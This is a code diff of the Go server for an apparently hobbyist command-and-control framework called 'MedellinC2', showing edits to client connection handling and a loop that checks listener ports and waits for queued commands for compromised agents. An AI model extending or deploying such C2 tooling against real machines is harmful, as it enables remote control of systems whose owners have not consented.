@@ -59,7 +59,6 @@ func handleClientRequest(con net.Conn) {
 	if data.CheckDuplicateAgentUUID() == true {
 		/*Generate Agent in DB */
 		go getAgentInfoAndGenerateAgent()
-
 		/* Check if any commands have been sent to the database */
 
 		/* Issue Commands Remotely */
@@ -79,10 +78,11 @@ func handleClientRequest(con net.Conn) {
 			} */
 	}
 
+	//data.AwaitCommands()
+
 	for {
 		// Waiting for the client request
 		clientRequest, err := clientReader.ReadString('\n')
-
 		switch err {
 		case nil:
 			clientRequest := strings.TrimSpace(clientRequest)
@@ -112,9 +112,9 @@ func handleClientRequest(con net.Conn) {
 			} */
 
 		if _, err = con.Write([]byte("Successfully Connected to MedellinC2! Please await commands from the C2 server and continue being pwned!\n")); err != nil {
-			//sendRemoteCommand(con)
 			log.Printf("failed to respond to client: %v\n", err)
 		}
+
 	}
 }
 
@@ -136,6 +136,7 @@ func server() {
 	/* Run continuously in background to keep checking if any new listeners were created */
 	for range time.Tick(time.Second * 10) {
 		checkListenerPorts()
+		data.AwaitCommands()
 	}
 
 	/* Using sync.Map to not deal with concurrency slice/map issues */
@@ -187,9 +188,9 @@ func checkListenerPorts() {
 			//log.Fatalln(err)
 			continue
 		}
-
 		go openPorts(listener2)
 	}
+	println("New Listener Started")
 
 }
 
